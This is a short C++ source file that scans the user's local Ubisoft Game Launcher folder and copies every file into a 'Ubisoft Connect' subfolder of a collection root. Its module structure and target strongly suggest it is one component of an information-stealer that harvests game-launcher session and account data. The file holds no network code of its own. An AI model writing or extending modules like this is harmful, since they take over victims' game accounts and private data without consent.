//
// Created by .1qxz on 08.06.2024.
//

#include "UbisoftConnect.h"

static const fs::path UBISOFT_PATH = Utils::getLocalPath() / "Ubisoft Game Launcher";

void UbisoftConnect::execute(fs::path &root) {
    std::vector<fs::path> paths = FilesUtil::scanDirectory(UBISOFT_PATH);

    if(paths.empty())
        return;

    fs::path dst = root / "Ubisoft Connect";
    fs::create_directories(dst);

    for(fs::path &path : paths)
    {
        Utils::copy(path, dst);
    }
}